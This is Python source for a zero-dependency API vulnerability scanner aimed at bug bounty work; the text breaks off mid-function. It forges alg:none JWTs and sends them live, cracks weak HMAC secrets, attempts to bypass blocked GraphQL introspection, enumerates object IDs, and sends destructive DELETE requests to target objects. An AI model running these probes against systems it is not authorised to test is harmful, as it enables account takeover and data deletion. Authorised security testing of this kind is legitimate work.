#!/usr/bin/env python3
"""
API Security Scanner — Bug Bounty Edition
==========================================
Give it any URL. It discovers everything itself.

  - If you give a base URL (https://target.com):
      → Crawls for API endpoints, GraphQL, Swagger specs
      → Discovers auth endpoints, user endpoints, admin panels
      → Then scans every discovered endpoint for vulnerabilities

  - If you give a direct API URL (https://target.com/api/v1):
      → Scans immediately for all vulnerability classes

Zero dependencies. Python 3.9+ only.

Usage:
  python api_scanner.py --url https://target.com
  python api_scanner.py --url https://target.com/api --token YOUR_TOKEN
  python api_scanner.py --url https://target.com --crawl --output report
  python api_scanner.py --url https://target.com --module graphql
  python api_scanner.py --help
"""

import sys
import os
import re
import json
import csv
import io
import time
import base64
import hmac
import hashlib
import socket
import threading
import argparse
import traceback
from datetime import datetime, timezone
from urllib.request import urlopen, Request
from urllib.error import URLError, HTTPError
from urllib.parse import urljoin, urlparse, urlencode, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional
from pathlib import Path
from html.parser import HTMLParser

# ── Colour output ─────────────────────────────────────────────────
class C:
    RED    = "\033[91m"
    ORANGE = "\033[93m"
    YELLOW = "\033[33m"
    GREEN  = "\033[92m"
    BLUE   = "\033[94m"
    CYAN   = "\033[96m"
    PURPLE = "\033[95m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    RESET  = "\033[0m"

    @staticmethod
    def enable():
        if sys.platform == "win32":
            import ctypes
            try:
                ctypes.windll.kernel32.SetConsoleMode(
                    ctypes.windll.kernel32.GetStdHandle(-11), 7)
            except Exception:
                pass

C.enable()

VERSION = "4.0.0"

def banner():
    print(f"""
{C.BLUE}{C.BOLD}
  ╔══════════════════════════════════════════════════════════════╗
  ║        API Security Scanner — Bug Bounty Edition  v{VERSION}     ║
  ║   Discover  ▸  Enumerate  ▸  Exploit  ▸  Report             ║
  ╚══════════════════════════════════════════════════════════════╝
{C.RESET}{C.DIM}  Authorized security testing only.{C.RESET}
""")

# ══════════════════════════════════════════════════════════════════
# SEVERITY & FINDING
# ══════════════════════════════════════════════════════════════════

class Severity(str, Enum):
    CRITICAL = "CRITICAL"
    HIGH     = "HIGH"
    MEDIUM   = "MEDIUM"
    LOW      = "LOW"
    INFO     = "INFO"

SEV_COLOR = {
    Severity.CRITICAL: C.RED,
    Severity.HIGH:     C.ORANGE,
    Severity.MEDIUM:   C.YELLOW,
    Severity.LOW:      C.GREEN,
    Severity.INFO:     C.CYAN,
}
SEV_ORDER = {Severity.CRITICAL:0,Severity.HIGH:1,
             Severity.MEDIUM:2,Severity.LOW:3,Severity.INFO:4}

@dataclass
class Finding:
    title:       str
    severity:    Severity
    module:      str
    description: str = ""
    evidence:    str = ""
    remediation: str = ""
    endpoint:    Optional[str] = None
    cwe:         Optional[str] = None
    owasp:       Optional[str] = None
    cvss:        float = 0.0
    tags:        list  = field(default_factory=list)
    request:     str   = ""
    response:    str   = ""
    timestamp:   str   = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())

    def to_dict(self):
        return {k: (v.value if isinstance(v, Severity) else v)
                for k, v in self.__dict__.items()}

CVSS_MAP = {
    Severity.CRITICAL: 9.5,
    Severity.HIGH:     7.5,
    Severity.MEDIUM:   5.0,
    Severity.LOW:      2.5,
    Severity.INFO:     0.0,
}

# ══════════════════════════════════════════════════════════════════
# HTTP ENGINE
# ══════════════════════════════════════════════════════════════════

class HTTPEngine:
    """Handles all HTTP requests using only stdlib urllib."""

    def __init__(self, timeout=12, proxy=None, verify_ssl=True):
        self.timeout    = timeout
        self.proxy      = proxy
        self.verify_ssl = verify_ssl
        self._lock      = threading.Lock()
        self.request_count = 0

    def request(self, method, url, headers=None, body=None,
                allow_redirects=True) -> Optional[dict]:
        with self._lock:
            self.request_count += 1

        default_headers = {
            "User-Agent": f"APISecurityScanner/{VERSION} (Bug-Bounty-Tool)",
            "Accept":     "application/json, text/html, */*",
        }
        all_headers = {**default_headers, **(headers or {})}

        data = None
        if body is not None:
            if isinstance(body, dict):
                data = json.dumps(body).encode("utf-8")
                all_headers.setdefault("Content-Type", "application/json")
            elif isinstance(body, str):
                data = body.encode("utf-8")
            elif isinstance(body, bytes):
                data = body

        try:
            req = Request(url, data=data, headers=all_headers,
                          method=method.upper())
            ctx = None
            if not self.verify_ssl:
                import ssl
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE

            with urlopen(req, timeout=self.timeout, context=ctx) as resp:
                text = resp.read().decode("utf-8", errors="replace")
                return {
                    "status":  resp.status,
                    "text":    text,
                    "headers": dict(resp.headers),
                    "url":     resp.url,
                }
        except HTTPError as e:
            try:
                text = e.read().decode("utf-8", errors="replace")
            except Exception:
                text = ""
            return {"status": e.code, "text": text,
                    "headers": dict(e.headers), "url": url}
        except Exception:
            return None

    def get(self, url, headers=None):
        return self.request("GET", url, headers=headers)

    def post(self, url, headers=None, body=None):
        return self.request("POST", url, headers=headers, body=body)

    def delete(self, url, headers=None):
        return self.request("DELETE", url, headers=headers)

    def options(self, url, headers=None):
        return self.request("OPTIONS", url, headers=headers)

# ══════════════════════════════════════════════════════════════════
# DISCOVERY ENGINE
# ══════════════════════════════════════════════════════════════════

# Common API path patterns
API_PATHS = [
    # Version prefixes
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/v1", "/v2", "/v3",
    # Auth
    "/api/auth/login", "/api/auth", "/login", "/signin",
    "/api/token", "/oauth/token", "/auth",
    # Users
    "/api/users", "/api/user", "/api/users/1", "/api/me",
    "/api/profile", "/me", "/user",
    # Admin
    "/admin", "/api/admin", "/administration",
    "/api/admin/users", "/manage",
    # Health / debug
    "/health", "/api/health", "/status", "/api/status",
    "/debug", "/api/debug", "/api/debug/env",
    "/metrics", "/actuator", "/actuator/health",
    # Docs
    "/docs", "/api/docs", "/swagger", "/openapi",
    "/swagger.json", "/openapi.json", "/swagger-ui.html",
    "/api/swagger.json", "/api/openapi.json",
    "/redoc", "/api-docs", "/.well-known/openapi.json",
    # Common resources
    "/api/orders", "/api/products", "/api/items",
    "/api/accounts", "/api/payments", "/api/search",
    "/api/files", "/api/upload", "/api/config",
    # GraphQL
    "/graphql", "/api/graphql", "/gql", "/query",
    "/graphiql", "/playground", "/v1/graphql",
]

GRAPHQL_PATHS = [
    "/graphql", "/api/graphql", "/gql", "/query",
    "/graphiql", "/v1/graphql", "/v2/graphql",
    "/api/gql", "/graphql/v1", "/graphql/api",
    "/backend/graphql", "/internal/graphql",
]

SWAGGER_PATHS = [
    "/swagger.json", "/openapi.json", "/api/swagger.json",
    "/api/openapi.json", "/api-docs", "/api/api-docs",
    "/swagger/v1/swagger.json", "/v2/api-docs",
    "/.well-known/openapi.json", "/api/swagger/v1/swagger.json",
]

class LinkExtractor(HTMLParser):
    """Extract links and API references from HTML."""
    def __init__(self):
        super().__init__()
        self.links = []
        self.scripts = []

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == "a" and "href" in attrs:
            self.links.append(attrs["href"])
        if tag == "script" and "src" in attrs:
            self.scripts.append(attrs["src"])

class Discoverer:
    """
    Crawls a target URL to find API endpoints, GraphQL,
    Swagger specs, and other attack surface.
    """

    def __init__(self, http: HTTPEngine, base_url: str,
                 auth_headers: dict, verbose: bool = False):
        self.http         = http
        self.base_url     = base_url.rstrip("/")
        self.auth_headers = auth_headers
        self.verbose      = verbose
        self.found_apis:      list[str] = []
        self.found_graphql:   list[str] = []
        self.found_swagger:   list[str] = []
        self.found_auth:      list[str] = []
        self.all_endpoints:   list[str] = []

    def log(self, msg, color=C.DIM):
        if self.verbose:
            print(f"  {color}{msg}{C.RESET}")

    def _full(self, path):
        return self.base_url + path

    def discover(self) -> dict:
        print(f"\n  {C.CYAN}{C.BOLD}[DISCOVERY]{C.RESET} Scanning {self.base_url}")
        print(f"  {C.DIM}Probing {len(API_PATHS)} common paths...{C.RESET}\n")

        # 1. Probe common paths with threading
        results = {}
        lock = threading.Lock()

        def probe(path):
            url = self._full(path)
            resp = self.http.get(url, headers=self.auth_headers)
            if resp and resp["status"] not in (404, 410):
                with lock:
                    results[path] = resp["status"]

        with ThreadPoolExecutor(max_workers=20) as ex:
            list(ex.map(probe, API_PATHS))

        # 2. Categorise discovered paths
        for path, status in sorted(results.items()):
            url = self._full(path)
            self.all_endpoints.append(url)

            is_gql = any(p in path for p in ["/graphql","/gql","/query","/graphiql"])
            is_swagger = any(p in path for p in ["swagger","openapi","api-docs"])
            is_auth = any(p in path for p in ["/auth","/login","/token","/signin"])

            if is_gql:
                self.found_graphql.append(url)
                print(f"  {C.PURPLE}[GRAPHQL  ]{C.RESET} {path} — HTTP {status}")
            elif is_swagger:
                self.found_swagger.append(url)
                print(f"  {C.BLUE}[SWAGGER  ]{C.RESET} {path} — HTTP {status}")
            elif is_auth:
                self.found_auth.append(url)
                print(f"  {C.YELLOW}[AUTH     ]{C.RESET} {path} — HTTP {status}")
            else:
                self.found_apis.append(url)
                print(f"  {C.GREEN}[API      ]{C.RESET} {path} — HTTP {status}")

        # 3. Crawl homepage for more links
        self._crawl_homepage()

        # 4. Parse Swagger specs
        swagger_endpoints = self._parse_swagger_specs()
        for ep in swagger_endpoints:
            if ep not in self.all_endpoints:
                self.all_endpoints.append(ep)
                self.found_apis.append(ep)
                print(f"  {C.BLUE}[SWAGGER→ ]{C.RESET} {ep.replace(self.base_url,'')}")

        # 5. Check JavaScript files for API paths
        self._scan_js_files()

        # 6. Confirm GraphQL endpoints
        self._confirm_graphql()

        total = len(self.all_endpoints)
        print(f"\n  {C.GREEN}{C.BOLD}Discovery complete — {total} endpoints found{C.RESET}")
        print(f"  {C.DIM}API: {len(self.found_apis)} | GraphQL: {len(self.found_graphql)} | Auth: {len(self.found_auth)} | Swagger: {len(self.found_swagger)}{C.RESET}")

        return {
            "apis":      self.found_apis,
            "graphql":   self.found_graphql,
            "swagger":   self.found_swagger,
            "auth":      self.found_auth,
            "all":       self.all_endpoints,
        }

    def _crawl_homepage(self):
        """Extract API paths from the homepage HTML."""
        resp = self.http.get(self.base_url, headers=self.auth_headers)
        if not resp or resp["status"] != 200:
            return
        text = resp["text"] or ""

        # Look for API paths in the HTML/JS
        api_patterns = re.findall(
            r'["\'`](/(?:api|v\d|graphql|gql|auth|oauth)[^"\'`\s]*)["\' `]',
            text, re.IGNORECASE
        )
        for path in set(api_patterns):
            url = self._full(path) if path.startswith("/") else urljoin(self.base_url, path)
            if url not in self.all_endpoints:
                resp2 = self.http.get(url, headers=self.auth_headers)
                if resp2 and resp2["status"] not in (404, 410):
                    self.all_endpoints.append(url)
                    self.found_apis.append(url)
                    self.log(f"[JS-FOUND ] {path} — HTTP {resp2['status']}", C.GREEN)

        # Extract all links
        parser = LinkExtractor()
        try:
            parser.feed(text)
        except Exception:
            pass

    def _parse_swagger_specs(self) -> list[str]:
        """Download and parse Swagger/OpenAPI specs to get more endpoints."""
        endpoints = []
        for url in self.found_swagger:
            resp = self.http.get(url, headers=self.auth_headers)
            if not resp or resp["status"] != 200:
                continue
            try:
                spec = json.loads(resp["text"])
                # OpenAPI 3.x
                servers = spec.get("servers", [])
                base = servers[0].get("url", "") if servers else ""
                # Swagger 2.x
                if not base:
                    host   = spec.get("host", "")
                    scheme = (spec.get("schemes") or ["https"])[0]
                    bpath  = spec.get("basePath", "")
                    if host:
                        base = f"{scheme}://{host}{bpath}"

                for path, methods in spec.get("paths", {}).items():
                    full = (base.rstrip("/") + path) if base else (self.base_url + path)
                    endpoints.append(full)
                    self.log(f"[SPEC PATH] {path}", C.BLUE)
            except Exception:
                pass
        return endpoints

    def _scan_js_files(self):
        """Scan JavaScript files for hidden API endpoints."""
        resp = self.http.get(self.base_url, headers=self.auth_headers)
        if not resp:
            return
        parser = LinkExtractor()
        try:
            parser.feed(resp["text"] or "")
        except Exception:
            pass

        for js_src in parser.scripts[:10]:  # limit to first 10 JS files
            js_url = urljoin(self.base_url + "/", js_src)
            js_resp = self.http.get(js_url, headers=self.auth_headers)
            if not js_resp or js_resp["status"] != 200:
                continue
            js_text = js_resp["text"] or ""
            paths = re.findall(
                r'["\'`](/(?:api|v\d|graphql)[^"\'`\s]{1,100})["\' `]',
                js_text, re.IGNORECASE
            )
            for path in set(paths):
                url = self._full(path) if path.startswith("/") else urljoin(self.base_url, path)
                if url not in self.all_endpoints:
                    self.all_endpoints.append(url)
                    self.found_apis.append(url)
                    self.log(f"[JS-SCAN  ] {path}", C.CYAN)

    def _confirm_graphql(self):
        """Verify discovered GraphQL paths actually respond to GQL."""
        confirmed = []
        for url in self.found_graphql[:]:
            resp = self.http.post(url, headers={**self.auth_headers,
                                                "Content-Type":"application/json"},
                                  body={"query":"{__typename}"})
            if resp and ('"data"' in (resp["text"] or "") or
                         '"errors"' in (resp["text"] or "")):
                confirmed.append(url)
            else:
                self.found_graphql.remove(url)
        self.found_graphql = confirmed

# ══════════════════════════════════════════════════════════════════
# VULNERABILITY MODULES
# ══════════════════════════════════════════════════════════════════

# ── JWT ────────────────────────────────────────────────────────────
WEAK_SECRETS = [
    "secret","password","123456","changeme","supersecret","jwt_secret",
    "mysecret","secretkey","admin","test","qwerty","letmein","token",
    "apikey","private","key","12345678","pass","1234","secure","jwt",
    "secret123","password123","admin123","user","root","topsecret",
    "mysecretkey","jwtsecret","jwtpassword","peter","random_bytes",
    "secret_key","signing_key","my_secret","dev","development","hs256",
]

def b64url_dec(s):
    s = s.replace("-","+").replace("_","/")
    return base64.b64decode(s + "=="*((4-len(s)%4)%4))

def b64url_enc(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def decode_jwt(token):
    token = token.strip()
    if token.lower().startswith("bearer "):
        token = token[7:]
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Not a JWT: {len(parts)} parts")
    header  = json.loads(b64url_dec(parts[0]))
    payload = json.loads(b64url_dec(parts[1]))
    return header, payload, token

def craft_none_tokens(header, payload):
    for variant in ["none","None","NONE","nOnE"]:
        h = {**header, "alg": variant}
        h_e = b64url_enc(json.dumps(h, separators=(",",":")).encode())
        p_e = b64url_enc(json.dumps(payload, separators=(",",":")).encode())
        yield f"{h_e}.{p_e}."

def test_hmac(token, secret):
    parts = token.split(".")
    sig_input = f"{parts[0]}.{parts[1]}".encode()
    expected  = b64url_dec(parts[2])
    computed  = hmac.new(secret.encode(), sig_input, hashlib.sha256).digest()
    return hmac.compare_digest(computed, expected)

def scan_jwt(http, url, token, auth_headers, timeout=10):
    findings = []
    MOD = "JWTAnalyzer"
    if not token:
        return findings

    try:
        header, payload, raw = decode_jwt(token)
    except Exception as e:
        return findings

    alg = header.get("alg","").upper()

    # 1. alg:none live test
    if alg != "NONE":
        for forged in craft_none_tokens(header, payload):
            test_h = {**auth_headers, "Authorization": f"Bearer {forged}"}
            resp = http.get(url, headers=test_h)
            if resp and resp["status"] in (200,201,204):
                findings.append(Finding(
                    title="JWT alg:none Bypass — CONFIRMED",
                    severity=Severity.CRITICAL, module=MOD,
                    description="Server accepted a forged unsigned token. Authentication completely bypassed.",
                    evidence=f"Forged alg:none token → HTTP {resp['status']}",
                    remediation="Set algorithms=['HS256'] only. Never include 'none'.",
                    cwe="CWE-347", owasp="OWASP API2:2023",
                    cvss=9.8, endpoint=url,
                    tags=["jwt","alg-none","confirmed","critical"],
                ))
                break

    # 2. Weak secret
    if alg in ("HS256","HS384","HS512"):
        for secret in WEAK_SECRETS:
            try:
                if test_hmac(raw, secret):
                    findings.append(Finding(
                        title=f"JWT Signed With Weak Secret: '{secret}'",
                        severity=Severity.CRITICAL, module=MOD,
                        description=f"The HMAC secret '{secret}' was found in a common wordlist. Anyone can forge tokens.",
                        evidence=f"Cracked secret: '{secret}'",
                        remediation="Use a cryptographically random 256-bit secret. Rotate immediately.",
                        cwe="CWE-798", owasp="OWASP API2:2023",
                        cvss=9.1, endpoint=url,
                        tags=["jwt","weak-secret","critical"],
                    ))
                    break
            except Exception:
                continue

    # 3. Missing exp
    now = int(time.time())
    exp = payload.get("exp")
    if exp is None:
        findings.append(Finding(
            title="JWT Missing exp Claim — Token Never Expires",
            severity=Severity.HIGH, module=MOD,
            description="No expiry on this token. Stolen tokens remain valid indefinitely.",
            evidence="'exp' claim absent",
            remediation="Set exp = now + 900 seconds for access tokens.",
            cwe="CWE-613", owasp="OWASP API2:2023",
            cvss=7.5, endpoint=url, tags=["jwt","no-expiry"],
        ))
    elif exp < now:
        findings.append(Finding(
            title="Expired JWT Accepted by Server",
            severity=Severity.HIGH, module=MOD,
            description=f"Token expired {now-exp}s ago but server still returned {url} with HTTP 200.",
            evidence=f"exp={exp}, now={now}, delta={now-exp}s",
            remediation="Enforce exp validation on every request.",
            cwe="CWE-613", owasp="OWASP API2:2023",
            cvss=7.5, endpoint=url, tags=["jwt","expired"],
        ))

    # 4. Missing claims
    for claim in ("iss","sub","aud"):
        if claim not in payload:
            findings.append(Finding(
                title=f"JWT Missing '{claim}' Claim",
                severity=Severity.LOW, module=MOD,
                description=f"Standard claim '{claim}' absent. Reduces validation surface.",
                evidence=f"'{claim}' not in payload",
                remediation=f"Include and validate the '{claim}' claim.",
                cwe="CWE-345", owasp="OWASP API2:2023",
                cvss=3.1, endpoint=url, tags=["jwt","claims"],
            ))

    return findings

# ── GRAPHQL ────────────────────────────────────────────────────────
SENSITIVE_GQL_TYPES = [
    "password","secret","private","hidden","apikey","api_key",
    "token","admin","credential","auth","key","flag",
]

INTROSPECTION_QUERY = """{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name kind
      fields { name type { name kind ofType { name kind } } }
    }
  }
}"""

def scan_graphql(http, gql_url, auth_headers):
    findings = []
    MOD = "GraphQLScanner"
    headers = {**auth_headers, "Content-Type": "application/json"}

    # 1. Introspection
    resp = http.post(gql_url, headers=headers, body={"query": INTROSPECTION_QUERY})

    # Try bypass if blocked
    if not resp or resp["status"] != 200 or "__schema" not in (resp["text"] or ""):
        bypass_q = '{\n  __schema\n  { types { name fields { name } } } }'
        resp = http.post(gql_url, headers=headers, body={"query": bypass_q})

    if resp and resp["status"] == 200 and "__schema" in (resp["text"] or ""):
        try:
            data  = json.loads(resp["text"])
            types = data.get("data",{}).get("__schema",{}).get("types",[])

            findings.append(Finding(
                title="GraphQL Introspection Enabled",
                severity=Severity.HIGH, module=MOD,
                description=f"Full schema exposed via introspection — {len(types)} types discovered.",
                evidence=f"Types: {[t.get('name') for t in types[:8]]}",
                remediation="Disable introspection in production. Set introspection: false.",
                cwe="CWE-200", owasp="OWASP API8:2023",
                cvss=7.5, endpoint=gql_url, tags=["graphql","introspection"],
            ))

            # Sensitive type names
            sensitive = [t.get("name","") for t in types
                         if any(s in t.get("name","").lower() for s in SENSITIVE_GQL_TYPES)]
            if sensitive:
                findings.append(Finding(
                    title="GraphQL Schema Exposes Sensitive Types",
                    severity=Severity.MEDIUM, module=MOD,
                    description=f"Schema contains types with sensitive names: {sensitive[:6]}",
                    evidence=f"Sensitive types: {sensitive[:6]}",
                    remediation="Review schema design. Remove or restrict access to sensitive types.",
                    cwe="CWE-200", owasp="OWASP API3:2023",
                    cvss=5.3, endpoint=gql_url, tags=["graphql","sensitive-types"],
                ))

            # Try to query each type for private fields
            for t in types:
                tname = t.get("name","")
                if tname.startswith("_") or t.get("kind") != "OBJECT":
                    continue
                fields = t.get("fields") or []
                priv_fields = [f["name"] for f in fields
                               if any(s in f["name"].lower() for s in SENSITIVE_GQL_TYPES)]
                if priv_fields:
                    fields_str = " ".join(priv_fields)
                    q = f"{{ getAllPosts {{ {fields_str} }} }}"
                    r2 = http.post(gql_url, headers=headers, body={"query": q})
                    if r2 and r2["status"] == 200 and any(
                        f in (r2["text"] or "") for f in priv_fields
                    ):
                        findings.append(Finding(
                            title=f"GraphQL Private Fields Accessible on {tname}",
                            severity=Severity.CRITICAL, module=MOD,
                            description=f"Fields {priv_fields} are queryable on {tname} without restriction.",
                            evidence=f"Query returned sensitive fields: {priv_fields}",
                            remediation="Add field-level authorization. Check user role before returning sensitive fields.",
                            cwe="CWE-639", owasp="OWASP API3:2023",
                            cvss=9.1, endpoint=gql_url,
                            tags=["graphql","private-fields","critical"],
                        ))

        except Exception:
            pass

    # 2. Batch queries
    try:
        batch_data = json.dumps([{"query":"{__typename}"}]*5).encode()
        batch_resp = http.request("POST", gql_url,
                                  headers=headers, body=batch_data)
        if batch_resp and batch_resp["status"] == 200:
            try:
                parsed = json.loads(batch_resp["text"] or "")
                if isinstance(parsed, list) and len(parsed) >= 3:
                    findings.append(Finding(
                        title="GraphQL Batch Queries Accepted",
                        severity=Severity.HIGH, module=MOD,
                        description="Server accepts batched query arrays — rate limiting can be bypassed.",
                        evidence=f"5 queries in 1 request → {len(parsed)} responses",
                        remediation="Disable batching or limit to 1 query per request.",
                        cwe="CWE-799", owasp="OWASP API4:2023",
                        cvss=7.5, endpoint=gql_url, tags=["graphql","batch"],
                    ))
            except Exception:
                pass
    except Exception:
        pass

    # 3. Field suggestions
    r3 = http.post(gql_url, headers=headers, body={"query": "{usr{id}}"})
    if r3 and "did you mean" in (r3["text"] or "").lower():
        findings.append(Finding(
            title="GraphQL Field Suggestions Leak Schema Names",
            severity=Severity.LOW, module=MOD,
            description="'Did you mean...' error reveals valid field names without introspection.",
            evidence="Field suggestion found on typo query",
            remediation="Disable field suggestions: suggestions: false",
            cwe="CWE-200", owasp="OWASP API8:2023",
            cvss=3.1, endpoint=gql_url, tags=["graphql","field-suggestion"],
        ))

    # 4. No auth required check
    r4 = http.post(gql_url,
                   headers={"Content-Type":"application/json"},
                   body={"query": "{__typename}"})
    if r4 and r4["status"] == 200 and '"data"' in (r4["text"] or ""):
        findings.append(Finding(
            title="GraphQL Endpoint Accessible Without Authentication",
            severity=Severity.HIGH, module=MOD,
            description="GraphQL endpoint responds to queries without any Authorization header.",
            evidence=f"GET {gql_url} with no token → HTTP {r4['status']}",
            remediation="Require authentication on all GraphQL operations.",
            cwe="CWE-306", owasp="OWASP API2:2023",
            cvss=7.5, endpoint=gql_url, tags=["graphql","unauth"],
        ))

    return findings

# ── BOLA / IDOR ────────────────────────────────────────────────────
DATA_INDICATORS = [
    r'"id"\s*:', r'"email"\s*:', r'"username"\s*:',
    r'"name"\s*:', r'"user"\s*:', r'"account"\s*:',
    r'"phone"\s*:', r'"address"\s*:', r'"ssn"\s*:',
]

def looks_like_object(text):
    if not text or len(text) < 20:
        return False
    for pat in DATA_INDICATORS:
        if re.search(pat, text.lower()):
            return True
    return False

def objects_differ(t1, t2):
    try:
        return json.loads(t1) != json.loads(t2)
    except Exception:
        return t1.strip() != t2.strip()

OBJECT_PATTERNS = [
    "/api/users/{id}", "/api/user/{id}", "/users/{id}",
    "/api/orders/{id}", "/api/accounts/{id}", "/api/profile/{id}",
    "/api/v1/users/{id}", "/api/v1/orders/{id}",
    "/api/items/{id}", "/api/documents/{id}",
    "/api/posts/{id}", "/api/transactions/{id}",
]

def scan_bola(http, base_url, auth_headers):
    findings = []
    MOD = "BOLAScanner"
    base = base_url.rstrip("/")
    test_ids = ["1","2","3","100","1000"]

    # 1. Unauth access
    for pattern in OBJECT_PATTERNS[:8]:
        for oid in test_ids[:2]:
            url = base + pattern.replace("{id}", oid)
            resp = http.get(url)
            if resp and resp["status"] in (200,201) and looks_like_object(resp["text"] or ""):
                findings.append(Finding(
                    title="BOLA — Object Accessible Without Authentication",
                    severity=Severity.CRITICAL, module=MOD,
                    description=f"{url} returned object data with no Authorization header.",
                    evidence=f"GET {url} → HTTP {resp['status']} ({len(resp['text'])} bytes, no token)",
                    remediation="Add authentication. Validate object ownership on every request.",
                    cwe="CWE-639", owasp="OWASP API1:2023",
                    cvss=9.1, endpoint=url,
                    tags=["bola","unauth","critical"],
                ))
                break

    # 2. Sequential enumeration (authenticated)
    for pattern in OBJECT_PATTERNS[:6]:
        hits = []
        for oid in test_ids:
            url = base + pattern.replace("{id}", oid)
            resp = http.get(url, headers=auth_headers)
            if resp and resp["status"] == 200 and looks_like_object(resp["text"] or ""):
                hits.append((oid, resp["text"]))
        if len(hits) >= 2 and objects_differ(hits[0][1], hits[1][1]):
            findings.append(Finding(
                title="BOLA — Sequential Object IDs Enumerable",
                severity=Severity.HIGH, module=MOD,
                description=f"Pattern '{pattern}' returns distinct objects for sequential IDs.",
                evidence=f"IDs {[h[0] for h in hits[:3]]} all return valid objects",
                remediation="Validate ownership server-side. Use UUIDs instead of sequential IDs.",
                cwe="CWE-639", owasp="OWASP API1:2023",
                cvss=7.5, endpoint=pattern, tags=["bola","sequential"],
            ))

    # 3. Verb tampering
    for pattern in OBJECT_PATTERNS[:4]:
        url = base + pattern.replace("{id}","1")
        get_r = http.get(url, headers=auth_headers)
        if get_r and get_r["status"] in (200,201):
            del_r = http.delete(url, headers=auth_headers)
            if del_r and del_r["status"] in (200,201,204):
                findings.append(Finding(
                    title="BOLA — Unauthorized Deletion via HTTP DELETE",
                    severity=Severity.HIGH, module=MOD,
                    description=f"DELETE {url} returned {del_r['status']} without ownership check.",
                    evidence=f"DELETE {url} → HTTP {del_r['status']}",
                    remediation="Validate ownership before any write or delete operation.",
                    cwe="CWE-639", owasp="OWASP API1:2023",
                    cvss=8.1, endpoint=url, tags=["bola","verb-tampering"],
                ))
                break

    # 4. Query param IDOR
    for param in ["user_id","userId","id","uid","account_id"]:
        results = []
        for val in test_ids[:3]:
            url = f"{base}?{param}={val}"
            resp = http.get(url, headers=auth_headers)
            if resp and resp["status"] == 200 and looks_like_object(resp["text"] or ""):
                results.append((val, resp["text"]))
        if len(results) >= 2 and objects_differ(results[0][1], results[1][1]):
            findings.append(Finding(
                title=f"BOLA — Query Parameter ?{param}= Enables Enumeration",
                severity=Severity.HIGH, module=MOD,
                description=f"?{param}= accepts multiple values and returns distinct objects.",
                evidence=f"?{param}={results[0][0]} and ?{param}={results[1][0]} return different data",
                remediation=f"Derive object identity from auth token, not from ?{param}=",
                cwe="CWE-639", owasp="OWASP API1:2023",
                cvss=7.5, endpoint=f"{base}?{param}=*", tags=["bola","query-param"],
            ))

    return findings

# ── SECURITY HEADERS ───────────────────────────────────────────────
REQUIRED_HEADERS = {
    "strict-transport-security": ("HSTS missing — SSL-stripping possible", Severity.MEDIUM, "CWE-319", 5.3),
    "content-security-policy":   ("CSP missing — XSS impact unrestricted",  Severity.MEDIUM, "CWE-693", 5.3),
    "x-frame-options":           ("Clickjacking protection missing",         Severity.MEDIUM, "CWE-1021",4.3),
    "x-content-type-options":    ("MIME sniffing protection missing",        Severity.LOW,    "CWE-693", 3.1),
    "cache-control":             ("Responses may be cached with sensitive data",Severity.LOW,  "CWE-524", 3.1),
    "permissions-policy":        ("Browser feature policy not set",          Severity.LOW,    "CWE-693", 2.5),
}

DISCLOSURE_HEADERS = [
    "server","x-powered-by","x-aspnet-version",
    "x-aspnetmvc-version","x-generator","x-runtime","via",
]

def scan_headers(http, url, auth_headers):
    findings = []
    MOD = "HeaderScanner"

    resp = http.get(url, headers=auth_headers)
    if not resp:
        return findings

    hdrs = {k.lower():v for k,v in resp["headers"].items()}

    # CORS
    acao = hdrs.get("access-control-allow-origin","")
    acac = hdrs.get("access-control-allow-credentials","").lower()

    if acao == "*" and acac == "true":
        findings.append(Finding(
            title="CORS — Wildcard Origin + Credentials",
            severity=Severity.CRITICAL, module=MOD,
            description="ACAO:* + ACAC:true allows any site to make credentialed cross-origin requests.",
            evidence=f"Access-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true",
            remediation="Use explicit origin allowlist. Never combine * with credentials:true.",
            cwe="CWE-942", owasp="OWASP API8:2023",
            cvss=9.1, endpoint=url, tags=["headers","cors","critical"],
        ))
    elif acao == "*":
        findings.append(Finding(
            title="CORS — Wildcard Origin Allows Any Domain",
            severity=Severity.MEDIUM, module=MOD,
            description="Any website can read responses from this API.",
            evidence="Access-Control-Allow-Origin: *",
            remediation="Replace * with an explicit trusted origin list.",
            cwe="CWE-942", owasp="OWASP API8:2023",
            cvss=5.3, endpoint=url, tags=["headers","cors"],
        ))

    # Origin reflection
    probe_hdrs = {**auth_headers, "Origin":"https://evil-attacker-test.com"}
    probe = http.get(url, headers=probe_hdrs)
    if probe:
        probe_resp_hdrs = {k.lower():v for k,v in probe["headers"].items()}
        reflected = probe_resp_hdrs.get("access-control-allow-origin","")
        if reflected == "https://evil-attacker-test.com":
            sev = Severity.CRITICAL if acac == "true" else Severity.HIGH
            findings.append(Finding(
                title="CORS — Origin Reflection Vulnerability",
                severity=sev, module=MOD,
                description="Server reflects any arbitrary Origin back — CSRF and cross-origin data theft possible.",
                evidence=f"Sent Origin: evil-attacker-test.com → ACAO: {reflected}",
                remediation="Validate Origin against a strict whitelist. Never reflect the request Origin.",
                cwe="CWE-942", owasp="OWASP API8:2023",
                cvss=8.8 if sev==Severity.CRITICAL else 7.4,
                endpoint=url, tags=["headers","cors","reflection"],
            ))

    # Missing security headers
    for hdr, (reason, sev, cwe, cvss_val) in REQUIRED_HEADERS.items():
        if hdr not in hdrs:
            findings.append(Finding(
                title=f"Missing Security Header: {hdr.title()}",
                severity=sev, module=MOD,
                description=reason,
                evidence=f"'{hdr}' absent from response",
                remediation=f"Add '{hdr.title()}' to all API responses.",
                cwe=cwe, owasp="OWASP API8:2023",
                cvss=cvss_val, endpoint=url, tags=["headers","missing"],
            ))

    # Technology disclosure
    for h in DISCLOSURE_HEADERS:
        val = hdrs.get(h)
        if val:
            findings.append(Finding(
                title=f"Server Technology Disclosed: {h.title()}",
                severity=Severity.LOW, module=MOD,
                description=f"{h.title()}: {val} reveals server technology to attackers.",
                evidence=f"{h.title()}: {val}",
                remediation=f"Remove or neutralise the {h.title()} header.",
                cwe="CWE-200", owasp="OWASP API8:2023",
